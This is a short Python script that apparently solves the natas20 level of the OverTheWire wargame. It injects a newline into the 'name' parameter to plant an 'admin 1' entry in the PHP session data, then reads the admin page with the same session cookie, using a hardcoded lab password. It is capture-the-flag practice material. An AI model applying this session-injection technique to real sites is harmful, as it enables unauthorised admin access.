import requests
from requests.auth import HTTPBasicAuth
from binascii import hexlify as hex

Auth=HTTPBasicAuth('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

uri="http://natas20.natas.labs.overthewire.org/index.php?debug"

r = requests.get(uri+"&name=admin%0Aadmin%201",auth=Auth,cookies=dict(PHPSESSID="myboxnow"))
r = requests.get(uri,auth=Auth,cookies=dict(PHPSESSID="myboxnow"))
print(r.text)
